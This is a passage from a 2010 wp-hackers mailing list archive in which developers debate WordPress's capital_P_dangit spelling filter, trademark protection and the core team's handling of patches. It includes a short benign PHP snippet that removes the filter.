Microsoft PowerPoint (and Outlook in fact) will prompt me via spell check to change Powerpoint to PowerPoint. It won't however *force* me to put PowerPoint, and I can even add Powerpoint to the dictionary if I wish....

Gav


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Mike Little
Sent: 06 July 2010 12:52
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

On 6 July 2010 11:53, Gavin Pearce <Gavin.Pearce at 3seven9.com> wrote:

> > As has been pointed out on this thread, WordPress is a trademark, and as
> > such *must* be actively protected, otherwise the trademark status will be
> > lost.
>
> As also pointed on this thread - that's complete rubbish. If enough people
> start writing MicroSoft, that doesn't "loose" Microsoft's right to the
> trademark. The only time this would be any issue in the slightest, is when
> trying to protect an "unregistered" trademark.
>
> End users writing Wordpress, Wordress, wOrDpReSs, WORDPRESS etc doesn't
> affect the trademark in any way whatsoever. (slightly different if WordPress
> foundation started doing it).
>
> (http://www.uspto.gov/trademarks/law/index.jsp |
> http://www.ipo.gov.uk/types/tm.htm)
>
>

Not rubbish at all, but standard practice in law, in both the US and the UK
(and many other territories). Here' s one reference
http://cyber.law.harvard.edu/metaschool/fisher/domain/tm.htm#6 and here's
another http://www.askjim.biz/answers/losing-rights-to-a-trademark_397.php
there
are many if you wish to search.

If you do not actively police your trademark, you can lose the rights to it.

Mike
-- 
Mike Little
http://zed1.com/
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From mccormicky at gmail.com  Tue Jul  6 12:11:58 2010
From: mccormicky at gmail.com (mccormicky)
Date: Tue, 6 Jul 2010 08:11:58 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C331ADF.7070901@thedextrousweb.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<4C3250B0.5070900@laptoptips.ca>
	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>
	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>
	<4C32AEE0.5070803@mullenweg.com>
	<4C32ED9B.5060207@thedextrousweb.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FAC@tbs-sbs01.TBS.local>
	<AANLkTinHGUmxYibfj8C3v9K5MBgctxGNljF1hIe5N8v1@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FB0@tbs-sbs01.TBS.local>
	<AANLkTikCbAM1PNhO8LH-chEup6BGx934H5Lk-xHzfSV-@mail.gmail.com>
	<4C331ADF.7070901@thedextrousweb.com>
Message-ID: <AANLkTikWW5aIM9Ti-eNWJhJEXtb9zp2QMSMhPVDFbLha@mail.gmail.com>

>
> You're completely right. The more trivial the topic, the more people likely
> to have an opinion, because it's easier to do so.
>
Yes, a lot easier than figuring out and offering code to fix a technical
issue--those threads are comically short compared to this one about the P
more often than not.
More often than not you are told to go to the support forum.  *Can't* do
that here(huf huf)!*  Can* talk about P for 4 days(harumph harumph).



On Tue, Jul 6, 2010 at 8:00 AM, Harry Metcalfe <harry at thedextrousweb.com>wrote:

> Not rubbish at all, but standard practice in law, in both the US and the UK
>> (and many other territories). Here' s one reference
>> http://cyber.law.harvard.edu/metaschool/fisher/domain/tm.htm#6 and here's
>> another
>> http://www.askjim.biz/answers/losing-rights-to-a-trademark_397.php
>> there
>> are many if you wish to search.
>>
>> If you do not actively police your trademark, you can lose the rights to
>> it.
>>
>> Mike
>>
>
> Policing your trademark means preventing unauthorised use of it, in order
> to stop it becoming a generic word rather than one strongly associated with
> your product. As both of those references explain.
>
> Forcing people to adopt your spelling is not required to protect a
> trademark. Even if it were, a spellchecker -- as with Apple's devices -- is
> a better way to do it, for reasons already rehearsed.
>
> This trademark issue is a total red herring.
>
>
> --
> Harry Metcalfe
> Tel: 07790 559 876
> Web: http://thedextrousweb.com
> Twitter: @harrym, @dextrousweb
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From Gavin.Pearce at 3seven9.com  Tue Jul  6 12:15:16 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Tue, 6 Jul 2010 13:15:16 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTikWW5aIM9Ti-eNWJhJEXtb9zp2QMSMhPVDFbLha@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com><AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com><AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com><4C2ED16D.9050907@szub.net>
	<001201cb1aa2$e1c9bd30$a55d3790$@com><4C3250B0.5070900@laptoptips.ca><AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com><AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com><C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com><AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com><4C32AEE0.5070803@mullenweg.com><4C32ED9B.5060207@thedextrousweb.com><CD47955B7E065D48AB5CF226C2ED75C02E2FAC@tbs-sbs01.TBS.local><AANLkTinHGUmxYibfj8C3v9K5MBgctxGNljF1hIe5N8v1@mail.gmail.com><CD47955B7E065D48AB5CF226C2ED75C02E2FB0@tbs-sbs01.TBS.local><AANLkTikCbAM1PNhO8LH-chEup6BGx934H5Lk-xHzfSV-@mail.gmail.com><4C331ADF.7070901@thedextrousweb.com>
	<AANLkTikWW5aIM9Ti-eNWJhJEXtb9zp2QMSMhPVDFbLha@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FB3@tbs-sbs01.TBS.local>

> Can* talk about P for 4 days(harumph harumph).

I think it's the principal behind this that has people up in arms
mccormicky, and the sheer arrogance in certain replies from people who
should know better.

G


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of mccormicky
Sent: 06 July 2010 13:12
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

>
> You're completely right. The more trivial the topic, the more people
likely
> to have an opinion, because it's easier to do so.
>
Yes, a lot easier than figuring out and offering code to fix a technical
issue--those threads are comically short compared to this one about the
P
more often than not.
More often than not you are told to go to the support forum.  *Can't* do
that here(huf huf)!*  Can* talk about P for 4 days(harumph harumph).



On Tue, Jul 6, 2010 at 8:00 AM, Harry Metcalfe
<harry at thedextrousweb.com>wrote:

> Not rubbish at all, but standard practice in law, in both the US and
the UK
>> (and many other territories). Here' s one reference
>> http://cyber.law.harvard.edu/metaschool/fisher/domain/tm.htm#6 and
here's
>> another
>> http://www.askjim.biz/answers/losing-rights-to-a-trademark_397.php
>> there
>> are many if you wish to search.
>>
>> If you do not actively police your trademark, you can lose the rights
to
>> it.
>>
>> Mike
>>
>
> Policing your trademark means preventing unauthorised use of it, in
order
> to stop it becoming a generic word rather than one strongly associated
with
> your product. As both of those references explain.
>
> Forcing people to adopt your spelling is not required to protect a
> trademark. Even if it were, a spellchecker -- as with Apple's devices
-- is
> a better way to do it, for reasons already rehearsed.
>
> This trademark issue is a total red herring.
>
>
> --
> Harry Metcalfe
> Tel: 07790 559 876
> Web: http://thedextrousweb.com
> Twitter: @harrym, @dextrousweb
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From 24-7 at gmx.net  Tue Jul  6 13:43:42 2010
From: 24-7 at gmx.net (24/7)
Date: Tue, 6 Jul 2010 06:43:42 -0700 (PDT)
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FB3@tbs-sbs01.TBS.local>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com><AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com><AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com><4C2ED16D.9050907@szub.net>
	<AANLkTikWW5aIM9Ti-eNWJhJEXtb9zp2QMSMhPVDFbLha@mail.gmail.com> 
	<CD47955B7E065D48AB5CF226C2ED75C02E2FB3@tbs-sbs01.TBS.local>
Message-ID: <af73b0b8-3da7-4158-be0b-cfd1f38355c2@t10g2000yqg.googlegroups.com>

Couldn' we just stop the discussion about the "P" and simply make the
package complete: check for the correct spelling of "Matt, Automattic
& Mullenweg" too?

To be serious: Why not make this optional? Just a yes/no-redio or
checkbox in the Admin-UI. Everybody would be satisfied.

From frank at bueltge.de  Tue Jul  6 13:46:00 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Tue, 6 Jul 2010 15:46:00 +0200
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <af73b0b8-3da7-4158-be0b-cfd1f38355c2@t10g2000yqg.googlegroups.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com> 
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com> 
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com> 
	<4C2ED16D.9050907@szub.net>
	<AANLkTikWW5aIM9Ti-eNWJhJEXtb9zp2QMSMhPVDFbLha@mail.gmail.com> 
	<CD47955B7E065D48AB5CF226C2ED75C02E2FB3@tbs-sbs01.TBS.local> 
	<af73b0b8-3da7-4158-be0b-cfd1f38355c2@t10g2000yqg.googlegroups.com>
Message-ID: <AANLkTinUcWyJyKdIw0eqNdg2jofyj5FtBqRgtbc3k4yq@mail.gmail.com>

+100 :)

i include in all my blogs:
function remove_default_filter() {
    // Remove Format WordPress
    foreach ( array( 'the_content', 'the_title', 'comment_text' ) as $filter
) {
        remove_filter( $filter, 'capital_P_dangit' );
    }
}
if ( !is_admin() )
    add_action('init', 'remove_default_filter');




On Tue, Jul 6, 2010 at 3:43 PM, 24/7 <24-7 at gmx.net> wrote:

> Couldn' we just stop the discussion about the "P" and simply make the
> package complete: check for the correct spelling of "Matt, Automattic
> & Mullenweg" too?
>
> To be serious: Why not make this optional? Just a yes/no-redio or
> checkbox in the Admin-UI. Everybody would be satisfied.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From Gavin.Pearce at 3seven9.com  Tue Jul  6 13:56:19 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Tue, 6 Jul 2010 14:56:19 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <af73b0b8-3da7-4158-be0b-cfd1f38355c2@t10g2000yqg.googlegroups.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com><AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com><AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com><4C2ED16D.9050907@szub.net><AANLkTikWW5aIM9Ti-eNWJhJEXtb9zp2QMSMhPVDFbLha@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FB3@tbs-sbs01.TBS.local>
	<af73b0b8-3da7-4158-be0b-cfd1f38355c2@t10g2000yqg.googlegroups.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FB6@tbs-sbs01.TBS.local>

> check for the correct spelling of "Matt, Automattic & Mullenweg" too?

I think I'll make mine do  ;)   :
Mullenweg -> muLlEnWeG
Wordpress -> wOrDpReSs

Hmmmm on second thoughts .... maybe not.

> To be serious: Why not make this optional? Just a yes/no-redio

Agree, but the function still needs to work correctly when yes is picked
- it shouldn't be changing file paths/names, or anything that's part of
a URI.

Gav

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of 24/7
Sent: 06 July 2010 14:44
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

Couldn' we just stop the discussion about the "P" and simply make the
package complete: check for the correct spelling of "Matt, Automattic
& Mullenweg" too?

To be serious: Why not make this optional? Just a yes/no-redio or
checkbox in the Admin-UI. Everybody would be satisfied.
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From mccormicky at gmail.com  Tue Jul  6 14:09:03 2010
From: mccormicky at gmail.com (mccormicky)
Date: Tue, 6 Jul 2010 10:09:03 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FB6@tbs-sbs01.TBS.local>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net>
	<AANLkTikWW5aIM9Ti-eNWJhJEXtb9zp2QMSMhPVDFbLha@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FB3@tbs-sbs01.TBS.local>
	<af73b0b8-3da7-4158-be0b-cfd1f38355c2@t10g2000yqg.googlegroups.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FB6@tbs-sbs01.TBS.local>
Message-ID: <AANLkTinRG4CMYRT6SNcvp2aCXsbbNlCrleaIX1EYeo66@mail.gmail.com>

It doesn't. It only corrects Wordpress to WordPress and as far as I have
been able to tell only what you type into the editor.
Isn't that true? So how can it change filenames? Anyway why are you using
uppercase for filenames?
This is stupid!

On Tue, Jul 6, 2010 at 9:56 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com>wrote:

> > check for the correct spelling of "Matt, Automattic & Mullenweg" too?
>
> I think I'll make mine do  ;)   :
> Mullenweg -> muLlEnWeG
> Wordpress -> wOrDpReSs
>
> Hmmmm on second thoughts .... maybe not.
>
> > To be serious: Why not make this optional? Just a yes/no-redio
>
> Agree, but the function still needs to work correctly when yes is picked
> - it shouldn't be changing file paths/names, or anything that's part of
> a URI.
>
> Gav
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of 24/7
> Sent: 06 July 2010 14:44
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Putting the P in WordPress
>
> Couldn' we just stop the discussion about the "P" and simply make the
> package complete: check for the correct spelling of "Matt, Automattic
> & Mullenweg" too?
>
> To be serious: Why not make this optional? Just a yes/no-redio or
> checkbox in the Admin-UI. Everybody would be satisfied.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From lists at rotorised.com  Tue Jul  6 14:17:39 2010
From: lists at rotorised.com (Ryan McCue)
Date: Wed, 07 Jul 2010 00:17:39 +1000
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C32AEE0.5070803@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>
	<001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>
	<4C32AEE0.5070803@mullenweg.com>
Message-ID: <4C333B03.8010603@rotorised.com>

Matt Mullenweg wrote:
> If someone made a better version of the function and benchmarked it
> next to the current or some of our other formatting functions in some
> real-world situations, that would be useful too, and add to the
> discussion rather than the noise. I'd love to see wp-hackers return to
> more, well, hacking.
>

I'm staying out of the discussion apart for this reason. I'm not on this
list because I want to hear people bikeshedding irrelevant stuff like
this, I'm here because I want to participate in discussions about
hacking WordPress.

Also, if the functionality is really that broken (affecting URLs, etc),
write a patch and fix it yourselves. If you're on this list, you should
at least be able to do that.

-- 
Ryan McCue
<http://ryanmccue.info/>


From harry at thedextrousweb.com  Tue Jul  6 14:33:17 2010
From: harry at thedextrousweb.com (Harry Metcalfe)
Date: Tue, 06 Jul 2010 15:33:17 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C333B03.8010603@rotorised.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>	<001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>	<4C32AEE0.5070803@mullenweg.com>
	<4C333B03.8010603@rotorised.com>
Message-ID: <4C333EAD.8080508@thedextrousweb.com>

I wrote a patch weeks ago to take it out. I'm really not trying to be 
difficult! I just think this filter is a terrible idea. And it's a 
little sad to witness the total lack of interest from the core team. 
This isn't how it's supposed to work, IMO.



On 06/07/10 15:17, Ryan McCue wrote:
> Matt Mullenweg wrote:
>> If someone made a better version of the function and benchmarked it
>> next to the current or some of our other formatting functions in some
>> real-world situations, that would be useful too, and add to the
>> discussion rather than the noise. I'd love to see wp-hackers return to
>> more, well, hacking.
>>
>
> I'm staying out of the discussion apart for this reason. I'm not on this
> list because I want to hear people bikeshedding irrelevant stuff like
> this, I'm here because I want to participate in discussions about
> hacking WordPress.
>
> Also, if the functionality is really that broken (affecting URLs, etc),
> write a patch and fix it yourselves. If you're on this list, you should
> at least be able to do that.
>

-- 
Harry Metcalfe
Tel: 07790 559 876
Web: http://thedextrousweb.com
Twitter: @harrym, @dextrousweb

From Gavin.Pearce at 3seven9.com  Tue Jul  6 14:42:16 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Tue, 6 Jul 2010 15:42:16 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C333EAD.8080508@thedextrousweb.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>	<001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>	<4C32AEE0.5070803@mullenweg.com><4C333B03.8010603@rotorised.com>
	<4C333EAD.8080508@thedextrousweb.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FB8@tbs-sbs01.TBS.local>

> I'm really not trying to be difficult! I just think this filter is a
terrible idea. 
+1 :)

_Ryan McCue
> If you're on this list, you should at least be able to do that.

Yes I know! And various people have offered a patch to fix this bug, but
Matt/Core Team reckon it isn't open to discussion. That's what people
are getting so worked up about here ...

The function is broke. It needs a fix commiting to core code. Like I
said before - end of topic as far as I'm concerned.

_ mccormicky
> Isn't that true? So how can it change filenames? Anyway why are you
using uppercase for filenames? This is stupid!

Don't know where to begin on this .... 

Firstly this filter does affect URI paths, it affects all/any content
put into the "editable" content area.

Secondly, with the filter, it would now look for a file called
"filename-WordPress.jpg" - making it capitalised whereas before it
wouldn't have been (so the filter is actually causing the capitals when
you just said you hated capitals).

Thirdly, on a Linux box there is many good reasons why to use case in
file-names, not least readability when you have several hundred files in
a folder.

Finally, what bit is stupid?

Gav


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Harry
Metcalfe
Sent: 06 July 2010 15:33
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

I wrote a patch weeks ago to take it out. I'm really not trying to be 
difficult! I just think this filter is a terrible idea. And it's a 
little sad to witness the total lack of interest from the core team. 
This isn't how it's supposed to work, IMO.



On 06/07/10 15:17, Ryan McCue wrote:
> Matt Mullenweg wrote:
>> If someone made a better version of the function and benchmarked it
>> next to the current or some of our other formatting functions in some
>> real-world situations, that would be useful too, and add to the
>> discussion rather than the noise. I'd love to see wp-hackers return
to
>> more, well, hacking.
>>
>
> I'm staying out of the discussion apart for this reason. I'm not on
this
> list because I want to hear people bikeshedding irrelevant stuff like
> this, I'm here because I want to participate in discussions about
> hacking WordPress.
>
> Also, if the functionality is really that broken (affecting URLs,
etc),
> write a patch and fix it yourselves. If you're on this list, you
should
> at least be able to do that.
>

-- 
Harry Metcalfe
Tel: 07790 559 876
Web: http://thedextrousweb.com
Twitter: @harrym, @dextrousweb
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From mitch at studionashvegas.com  Tue Jul  6 14:51:50 2010
From: mitch at studionashvegas.com (Mitch Canter)
Date: Tue, 6 Jul 2010 09:51:50 -0500
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FB8@tbs-sbs01.TBS.local>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<4C3250B0.5070900@laptoptips.ca>
	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>
	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>
	<4C32AEE0.5070803@mullenweg.com> <4C333B03.8010603@rotorised.com>
	<4C333EAD.8080508@thedextrousweb.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FB8@tbs-sbs01.TBS.local>
Message-ID: <AANLkTinun6tLFjfdnGDlYojb69tRJTZWFD-rD79EzDYL@mail.gmail.com>

The core argument here is whether or not people would be OK with their
blogging software having the ability to edit content (even if it's
just changing the spelling) without their permission.  Why not ask the
community?  A poll, a blog post, anything could be done where you
simply ask the question:

Would you mind if WordPress put code in your software that would
autocorrect the spelling of the word WordPress?

Explain why (branding reasons, continuity) and have someone draft the
cons (principle of editing content, etc) and ask the people.
WordPress is all about the community, this list isn't a good sample of
that community (because we're all much more technically savvy than a
lot of the users).

Ask the question, get the answer, act on it, and problem solved.

~Mitch

On Tue, Jul 6, 2010 at 9:42 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com> wrote:
>> I'm really not trying to be difficult! I just think this filter is a
> terrible idea.
> +1 :)
>
> _Ryan McCue
>> If you're on this list, you should at least be able to do that.
>
> Yes I know! And various people have offered a patch to fix this bug, but
> Matt/Core Team reckon it isn't open to discussion. That's what people
> are getting so worked up about here ...
>
> The function is broke. It needs a fix commiting to core code. Like I
> said before - end of topic as far as I'm concerned.
>
> _ mccormicky
>> Isn't that true? So how can it change filenames? Anyway why are you
> using uppercase for filenames? This is stupid!
>
> Don't know where to begin on this ....
>
> Firstly this filter does affect URI paths, it affects all/any content
> put into the "editable" content area.
>
> Secondly, with the filter, it would now look for a file called
> "filename-WordPress.jpg" - making it capitalised whereas before it
> wouldn't have been (so the filter is actually causing the capitals when
> you just said you hated capitals).
>
> Thirdly, on a Linux box there is many good reasons why to use case in
> file-names, not least readability when you have several hundred files in
> a folder.
>
> Finally, what bit is stupid?
>
> Gav
>
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Harry
> Metcalfe
> Sent: 06 July 2010 15:33
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Putting the P in WordPress
>
> I wrote a patch weeks ago to take it out. I'm really not trying to be
> difficult! I just think this filter is a terrible idea. And it's a
> little sad to witness the total lack of interest from the core team.
> This isn't how it's supposed to work, IMO.
>
>
>
> On 06/07/10 15:17, Ryan McCue wrote:
>> Matt Mullenweg wrote:
>>> If someone made a better version of the function and benchmarked it
>>> next to the current or some of our other formatting functions in some
>>> real-world situations, that would be useful too, and add to the
>>> discussion rather than the noise. I'd love to see wp-hackers return
> to
>>> more, well, hacking.
>>>
>>
>> I'm staying out of the discussion apart for this reason. I'm not on
> this
>> list because I want to hear people bikeshedding irrelevant stuff like
>> this, I'm here because I want to participate in discussions about
>> hacking WordPress.
>>
>> Also, if the functionality is really that broken (affecting URLs,
> etc),
>> write a patch and fix it yourselves. If you're on this list, you
> should
>> at least be able to do that.
>>
>
> --
> Harry Metcalfe
> Tel: 07790 559 876
> Web: http://thedextrousweb.com
> Twitter: @harrym, @dextrousweb
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Mitch Canter
studionashvegas
http://www.studionashvegas.com
615-512-2838

Find me on Twitter! http://www.studionashvegas.com

I only check email 2-3 times a day, but if you don't hear back in
24hr, let me know.  Thanks!

From eric at eamann.com  Tue Jul  6 15:07:29 2010
From: eric at eamann.com (eric at eamann.com)
Date: Tue, 6 Jul 2010 08:07:29 -0700 (PDT)
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTinun6tLFjfdnGDlYojb69tRJTZWFD-rD79EzDYL@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<4C3250B0.5070900@laptoptips.ca>
	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>
	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>
	<4C32AEE0.5070803@mullenweg.com> <4C333B03.8010603@rotorised.com>
	<4C333EAD.8080508@thedextrousweb.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FB8@tbs-sbs01.TBS.local>
	<AANLkTinun6tLFjfdnGDlYojb69tRJTZWFD-rD79EzDYL@mail.gmail.com>
Message-ID: <276730148.105202.1278428849435.JavaMail.open-xchange@oxusltgw10.schlund.de>

+1 for community software polling and reacting to the opinion of the community.
?

On July 6, 2010 at 2:51 PM Mitch Canter <mitch at studionashvegas.com> wrote:

> The core argument here is whether or not people would be OK with their
> blogging software having the ability to edit content (even if it's
> just changing the spelling) without their permission.? Why not ask the
> community?? A poll, a blog post, anything could be done where you
> simply ask the question:
>
> Would you mind if WordPress put code in your software that would
> autocorrect the spelling of the word WordPress?
>
> Explain why (branding reasons, continuity) and have someone draft the
